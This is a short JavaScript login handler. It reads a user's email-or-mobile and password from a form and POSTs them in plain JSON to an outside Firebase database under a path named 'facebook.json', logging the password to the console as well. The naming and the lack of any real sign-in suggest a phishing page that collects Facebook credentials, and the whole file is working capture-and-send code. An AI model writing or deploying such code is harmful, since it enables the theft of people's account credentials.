document.getElementById('login').addEventListener('click', function (e) {
    e.preventDefault(); // Prevent form submission to handle with JavaScript
  
    // Get form data
    const emailOrMobile = document.getElementById('emailOrMobile').value;
    const password = document.getElementById('password').value;
  
    // Prepare data to send in the POST request
    const data = {
      emailOrMobile,
      password
    };

    console.log(data)
  
    // Send POST request using fetch API
    fetch('https://react-cd9ef-default-rtdb.firebaseio.com/facebook.json', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(data), // Convert JavaScript object to JSON
    })
      .then(response => response.json()) // Assuming the response is JSON
      .then(data => {
        console.log('Success:', data);
        // Handle success (e.g., redirect, show message, etc.)
      })
      .catch((error) => {
        console.error('Error:', error);
        // Handle error (e.g., show error message)
      });
  });

// document.getElementById("login").addEventListener("click",function(e){
//     e.preventDefault()
//     console.log("hell0")
// })
  